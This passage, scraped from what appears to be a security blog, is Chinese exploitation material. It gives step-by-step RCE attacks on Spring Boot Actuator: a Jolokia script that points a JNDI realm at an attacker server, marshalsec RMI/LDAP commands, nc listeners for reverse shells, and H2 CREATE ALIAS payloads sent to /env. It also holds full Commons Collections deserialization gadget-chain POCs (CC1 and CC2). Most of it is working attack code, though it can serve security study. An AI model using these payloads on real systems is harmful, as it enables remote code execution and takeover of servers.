使用 python 快速开启 http serverpython2 -m SimpleHTTPServer 80python3 -m http.server 80 将步骤二中编译好的 class 文件拷贝到 HTTP 服务器根目录。 步骤四：架设恶意 rmi 服务下载 marshalsec ，使用下面命令架设对应的 rmi 服务： 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389 步骤五：监听反弹 shell 的端口一般使用 nc 监听端口，等待反弹 shell 1nc -lvp 6666 步骤六：发送恶意 payload根据实际情况修改 springboot-realm-jndi-rce.py 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsurl = 'http://127.0.0.1:8080/jolokia'create_realm = &#123; \"mbean\": \"Tomcat:type=MBeanFactory\", \"type\": \"EXEC\", \"operation\": \"createJNDIRealm\", \"arguments\": [\"Tomcat:type=Engine\"]&#125;wirte_factory = &#123; \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"WRITE\", \"attribute\": \"contextFactory\", \"value\": \"com.sun.jndi.rmi.registry.RegistryContextFactory\"&#125;write_url = &#123; \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"WRITE\", \"attribute\": \"connectionURL\", \"value\": \"rmi://your-vps-ip:1389/JNDIObject\"&#125;stop = &#123; \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"EXEC\", \"operation\": \"stop\", \"arguments\": []&#125;start = &#123; \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"EXEC\", \"operation\": \"start\", \"arguments\": []&#125;flow = [create_realm, wirte_factory, write_url, stop, start]for i in flow: print('%s MBean %s: %s ...' % (i['type'].title(), i['mbean'], i.get('operation', i.get('attribute')))) r = requests.post(url, json=i) r.json() print(r.status_code) 漏洞原理： 利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm 设置 connectionURL 地址为 RMI Service URL 设置 contextFactory 为 RegistryContextFactory 停止 Realm 启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞 漏洞分析：[https://paper.seebug.org/851/](Attack Spring Boot Actuator via jolokia Part 2) restart h2 database query RCE利用条件： 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 存在 com.h2database.h2 依赖（版本要求暂未知） 利用方法：步骤一：设置 spring.datasource.hikari.connection-test-query 属性⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发 spring 1.x（无回显执行命令） 1234POST /envContent-Type: application/x-www-form-urlencodedspring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception&#123;Runti','me.getRun','time().exe','c(new String[]&#123;m1,m2,m3&#125;);&#125;');CALL T5('cmd','/c','calc'); spring 2.x（无回显执行命令） 1234POST /actuator/envContent-Type: application/json&#123;\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception&#123;Runti','me.getRun','time().exe','c(new String[]&#123;m1,m2,m3&#125;);&#125;');CALL T5('cmd','/c','calc');\"&#125; 步骤二：重启应用spring 1.x 12POST &#x2F;restartContent-Type: application&#x2F;x-www-form-urlencoded spring 2.x 12POST &#x2F;actuator&#x2F;restartContent-Type: application&#x2F;json 漏洞原理： spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 CREATE ALIAS 创建自定义函数的 SQL 语句 其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句 restart 重启应用，会建立新的数据库连接 如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞 漏洞分析：remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database h2 database console JNDI RCE利用条件： 存在 com.h2database.h2 依赖（版本要求暂未知） spring 配置中启用 h2 console spring.h2.console.enabled=true 目标可以请求攻击者的服务器（请求可出外网） JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式） 利用方法：步骤一：访问路由获得 jsessionid直接访问目标开启 h2 console 的默认路由 /h2-console，目标会跳转到页面 /h2-console/login.jsp?jsessionid=xxxxxx，记录下实际的 jsessionid=xxxxxx 值。 步骤二：准备要执行的 Java 代码编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java， 使用兼容低版本 jdk 的方式编译： 1javac -source 1.5 -target 1.5 JNDIObject.java 然后将生成的 JNDIObject.class 文件拷贝到 步骤二 中的网站根目录。 步骤三：托管 class 文件在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） 1234# 使用 python 快速开启 http serverpython2 -m SimpleHTTPServer 80python3 -m http.server 80 将步骤二中编译好的 class 文件拷贝到 HTTP 服务器根目录。 步骤四：架设恶意 ldap 服务下载 marshalsec ，使用下面命令架设对应的 ldap 服务： 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;your-vps-ip:80&#x2F;#JNDIObject 1389 步骤五：监听反弹 shell 的端口一般使用 nc 监听端口，等待反弹 shell 1nc -lv 443 步骤六：发包触发 JNDI 注入根据实际情况，替换下面数据中的 jsessionid=xxxxxx、www.example.com 和 ldap://your-vps-ip:1389/JNDIObject 123456POST &#x2F;h2-console&#x2F;login.do?jsessionid&#x3D;xxxxxxHost: www.example.comContent-Type: application&#x2F;x-www-form-urlencodedReferer: http:&#x2F;&#x2F;www.example.com&#x2F;h2-console&#x2F;login.jsp?jsessionid&#x3D;xxxxxxlanguage&#x3D;en&amp;setting&#x3D;Generic+H2+%28Embedded%29&amp;name&#x3D;Generic+H2+%28Embedded%29&amp;driver&#x3D;javax.naming.InitialContext&amp;url&#x3D;ldap:&#x2F;&#x2F;your-vps-ip:1389&#x2F;JNDIObject&amp;user&#x3D;&amp;password&#x3D; 漏洞分析： mysql jdbc deserialization RCE参考链接https://github.com/LandGrey/SpringBootVulExploithttps://www.t00ls.net/articles-56671.html有趣的SpEL注入：https://xz.aliyun.com/t/9252 JAVA JNDI注入知识详解：http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/ Java安全之JNDI注入:https://www.anquanke.com/post/id/221917https://www.anquanke.com/post/id/212186","categories":[],"tags":[],"author":"ye1s"},{"title":"Apache-Commons-Collections漏洞分析","slug":"Apache-Commons-Collections漏洞分析","date":"2021-03-09T12:34:08.000Z","updated":"2021-03-10T08:09:42.839Z","comments":true,"path":"article/f1de98ef.html","link":"","permalink":"https://blog.cfyqy.com/article/f1de98ef.html","excerpt":"Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。","text":"Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。 CommonsCollections1 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：AnnotationInvocationHandler CommonsCollections2 命令执行载体：org.apache.xalan.xsltc.trax.TemplatesImpl 反序列化载体：PriorityQueue PriorityQueue.readObject()执行排序时，TransformingComparator.compare()会调用InvokerTransformer.transform()转换元素，进而获取第一个元素TemplatesImpl的newTransformer()并调用，最终导致命令执行 CommonsCollections3 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：AnnotationInvocationHandler 除Transformer数组元素组成不同外，与CommonsCollections1基本一致 CommonsCollections4 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：PriorityQueue PriorityQueue.readObject()执行排序时，TransformingComparator.compare()会调用ChainedTransformer.transform()转换元素，进而遍历执行Transformer数组中的每个元素，最终导致命令执行 CommonsCollections5 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：BadAttributeValueExpException BadAttributeValueExpException.readObject()当System.getSecurityManager()为null时，会调用TiedMapEntry.toString()，它在getValue()时会通过LazyMap.get()取值，最终导致命令执行 CommonsCollections6 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：HashSet HashSet.readObject()反序列化各元素后，会调用HashMap.put()将结果放进去，而它通过TiedMapEntry.hashCode()计算hash时，会调用getValue()触发LazyMap.get()导致命令执行 CommonsCollections7 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：Hashtable Hashtable#readObject反序列化各元素后，会调用reconstitutionPut，后面利用链中在比较hash值的时候用到了hashcode相等的两个字符串 yy 和 zZ。最后后AbstractMap#equals 触发LazyMap.get()导致命令执行 java -jar ysoserial.jar info 12345678910CommonsCollections1 @frohoff commons-collections:3.1 CommonsCollections10 commons-collections:3.2.1 CommonsCollections2 @frohoff commons-collections4:4.0 CommonsCollections3 @frohoff commons-collections:3.1 CommonsCollections4 @frohoff commons-collections4:4.0 CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1 CommonsCollections6 @matthias_kaiser commons-collections:3.1 CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1 CommonsCollections8 commons-collections4:4.0 CommonsCollections9 commons-collections:3.1 CommonsCollections1maven 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 核心利用链 1234567891011121314151617181920import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.lang.Runtime;public class ComCol1 &#123; public static void main(String[] args) &#123; Transformer[] transformers &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;,&#125;), &#125;; Transformer transformerChain &#x3D; new ChainedTransformer(transformers); transformerChain.transform(null); &#125;&#125; Commons Coolections的反序列化漏洞利用链，首先定义一个Transformer的数组，Transformer是一个接口，数组里的元素都继承了这个接口。 123public interface Transformer &#123; Object transform(Object var1);&#125; 进入数据第一个元素ConstantTransformer类中,该类在实例化时候，会将传入的对象赋值给iConstant属性，实现Transformer接口的transform方法中，返回iConstant指向的对象。 123456789101112131415161718192021public class ConstantTransformer implements Transformer, Serializable &#123; static final long serialVersionUID = 6374440726369055124L; public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null); private final Object iConstant; public static Transformer getInstance(Object constantToReturn) &#123; return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn)); &#125; public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; &#125; public Object getConstant() &#123; return this.iConstant; &#125;&#125; 进入InvokerTransformer类中，transform方法有反射获取方法并调用的操作 123456789101112131415public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;&#125;public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125;…… 反射如何调用runtime？ 12345678910import java.lang.reflect.Method;public class Test &#123; public static void main(String[] args) throws Exception &#123; Class run = Class.forName(\"java.lang.Runtime\"); Method getrun = run.getMethod(\"getRuntime\"); Method exec = run.getMethod(\"exec\",String.class); exec.invoke(getrun.invoke(run),\"calc\"); &#125;&#125; 反射调用需要获取类的名字，一般用Class.fotname获取，之后从这个类中使用getMethod获取需要调用的方法，最后用invoke方法调用这个方法。这里以Runtime类为例子，首先获取Runtime类的类名，然后获取getRuntime静态方法，因为Runtime类的构造函数是私有方法，只能用getRuntime方法获取类的实例，之后获取Runtime的exec方法，这个方法是执行命令的方法，也需要获取，exec不是静态方法，在invoke方法中需要传入object，所以，需要先调用getRuntime生成Runtime的对象，getRuntime方法是静态方法，他在调用invoke需要传入的是类名，反射调用时，满足以上条件后就能弹出计算器。 最后看一下ChainedTransformer类，transform方法遍历执行类实例化时传入的数组元素对象的transform，刚好提供了漏洞利用链 1234567891011public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers;&#125;public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object;&#125; 为什么用如下代码更简单一些，这里涉及到一个坑，在反序列化的时候函数中涉及到的对象必须是实现了Serializable接口，但是在这里Runtime.getRuntime()得到的是Runtime对象，然而Runtime对象是没有实现反序列化接口的所以，这里不能这么写。要通过ChainedTransformer 实现最终的执行链。 1234567 Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); transformerChain.transform(null);&#125; 上面理解了核心利用链，但该如何被调用。 CommonsCollections1 POC 涉及到了两个利用链 TransformedMap LazyMap （ysoserial 中利用链） LazyMap 利用链 POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class ComColLazyMap1 &#123; public static byte[] serialize(final Object obj) throws Exception &#123; ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); &#125; public static Object unserialize(final byte[] serialized) throws Exception &#123; ByteArrayInputStream btin = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(btin); return objIn.readObject(); &#125; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"calc\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); String classToSerialize = \"sun.reflect.annotation.AnnotationInvocationHandler\"; final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0]; constructor.setAccessible(true); InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap); final Map testMap = new HashMap(); Map evilMap = (Map) Proxy.newProxyInstance( testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(), secondInvocationHandler ); final Constructor&lt;?&gt; ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0]; ctor.setAccessible(true); final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap); byte[] serializeData=serialize(handler); unserialize(serializeData); &#125;&#125; 利用链 1234567891011121314151617181920Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec()Requires: commons-collections 进入LazyMap类中，发现在LazyMap的get方法中有一处调用transform方法 123456789public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; Object value = this.factory.transform(key); super.map.put(key, value); return value; &#125; else &#123; return super.map.get(key); &#125;&#125; 变量factory从LazyMap的构造方法中，factory为Transformer类型。 1234567891011public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(\"Factory must not be null\"); &#125; else &#123; this.factory = factory; &#125; &#125; 接下来就是如何处罚LazyMap中的get方法，进入AnnotationInvocationHandler中，AnnotationInvocationHandler invoke方法中调用想要的map类的get方法，同时只需要在构造方法处传入LazyMap即可 1234567891011121314151617181920212223//sun.reflect.annotation.AnnotationInvocationHandler AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; this.type = var1; this.memberValues = var2; &#125; public Object invoke(Object var1, Method var2, Object[] var3) &#123; String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\"equals\") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123; return this.equalsImpl(var3[0]); &#125; else &#123; assert var5.length == 0; if (var4.equals(\"toString\")) &#123; return this.toStringImpl(); &#125; else if (var4.equals(\"hashCode\")) &#123; return this.hashCodeImpl(); &#125; else if (var4.equals(\"annotationType\")) &#123; return this.type; &#125; else &#123; Object var6 = this.memberValues.get(var4); …… AnnotationInvocationHandler实现了InvocationHandler接口，可以用 jdk 代理调用。 TransformedMap 利用链 POC12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Annotation;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;//import sun.reflect.annotation.AnnotationInvocationHandler;import sun.reflect.annotation.AnnotationParser;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;public class ComColTestTransformedMap1 &#123; public static void main(String[] args) throws Exception &#123; //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"calc\"&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式 //onlyElement.setValue(\"foobar\"); //反射机制调用AnnotationInvocationHandler类的构造函数 Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); //取消构造函数修饰符限制 ctor.setAccessible(true); //获取AnnotationInvocationHandler类实例 Object instance = ctor.newInstance(Retention.class, outerMap); FileOutputStream f = new FileOutputStream(\"p.cer\"); ObjectOutputStream out = new ObjectOutputStream(f); out.writeObject(instance); FileInputStream fi = new FileInputStream(\"p.cer\"); ObjectInputStream in = new ObjectInputStream(fi); in.readObject(); &#125;&#125; 进入 TransformedMap 函数 1234567891011121314public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable &#123; private static final long serialVersionUID = 7023152376788900464L; protected final Transformer keyTransformer; protected final Transformer valueTransformer; public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer); &#125; protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; &#125; decorate方法是返回一个TransformedMap对象，其中valueTransformer是我们传入的Transformer数组，在TransformedMap类里还有一个很重要的函数 123protected Object checkSetValue(Object value) &#123; return this.valueTransformer.transform(value);&#125; 在setValue的时候就会触发这个函数，进入我们之前的利用链，map选择hashmap，因为他继承了反序列化接口，现在还需要一个readobject里面会调用setValue的入口来调用pop链，在jdk 7，这个入口就是sun.reflect.annotation.AnnotationInvocationHandler 123456789101112131415161718192021222324252627282930313233 AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; this.type = var1; this.memberValues = var2; &#125; private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); AnnotationType var2 = null; try &#123; var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; return; &#125; Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) &#123; Entry var5 = (Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) &#123; Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123; var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); &#125; &#125; &#125; &#125; CommonsCollections2maven 12345678910&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.25.0-GA&lt;/version&gt;&lt;/dependency&gt; 利用链 1234567ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() poc1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;public class ComCol2 &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"calc\"&#125;)&#125;); TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2\")); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 这个poc延用了cc1的后半段链，直接在最后触发了ChainedTransformer#transform方法导致rce。但是cc2在yso中的poc并不是这个，而是用到了一个新的点TemplatesImpl。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;public class ComCol2 &#123; public static void main(String[] args) throws Exception &#123; Constructor constructor &#x3D; Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer &#x3D; (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;); TransformingComparator comparator &#x3D; new TransformingComparator(transformer); PriorityQueue queue &#x3D; new PriorityQueue(2); &#x2F;&#x2F; javassist ClassPool pool &#x3D; ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc &#x3D; pool.makeClass(&quot;Demo&quot;); String cmd &#x3D; &quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes &#x3D; cc.toBytecode(); byte[][] targetByteCodes &#x3D; new byte[][]&#123;classBytes&#125;; TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance(); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); &#x2F;&#x2F; 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;); setFieldValue(templates, &quot;_class&quot;, null); Object[] queue_array &#x3D; new Object[]&#123;templates, 1&#125;; Field queue_field &#x3D; Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;); queue_field.setAccessible(true); queue_field.set(queue, queue_array); Field size &#x3D; Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(queue, 2); Field comparator_field &#x3D; Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); comparator_field.setAccessible(true); comparator_field.set(queue, comparator); ByteArrayOutputStream bos &#x3D; new ByteArrayOutputStream(); ObjectOutputStream oos &#x3D; new ObjectOutputStream(bos); oos.writeObject(queue); oos.close(); System.out.println(bos); ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field &#x3D; getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field &#x3D; null; try &#123; field &#x3D; clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() !&#x3D; null) &#123; field &#x3D; getField(clazz.getSuperclass(), fieldName); &#125; &#125; return field; &#125;&#125; 利用过程 发现PriorityQueue的readObject可以调用构造方法参数中的比较器参数的compare方法 接着发现TransformingComparator比较器可以利用compare方法以及其构造参数transformer调用任意对象的任意方法 又因为利用的是CommonsCollections4，所以之前的命令执行链不能使用，所以寻找了个新的命令执行点，只需调用该对象的newTransformer方法即可触发 新的命令执行点包含对Java字节码修改、加载、创建对象、反射等操作，分析起来也挺有意思 分析过程：javassist 带来的攻击面在于 Java 进行实例化对象的时候会调用 static 代码块 123456789public class Jdemo &#123; public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException &#123; ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\"TestDemo\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; cc.makeClassInitializer().insertBefore(cmd); cc.writeFile(); &#125;&#125; 生成 12345678public class TestDemo &#123; static &#123; Runtime.getRuntime().exec(\"calc\"); &#125; public TestDemo() &#123; &#125;&#125; TemplatesImpl类中存在加载字节码并创建实例的函数。 进入 TemplatesImpl，TemplatesImpl#newTransformer 调用了 getTransletInstance 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException&#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer;&#125; 进入 getTransletInstance 方法中,如果 _name 不为null的值，_class 设置为 null，这样会调用 defineTransletClasses。 123456789101112131415161718192021222324252627private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) 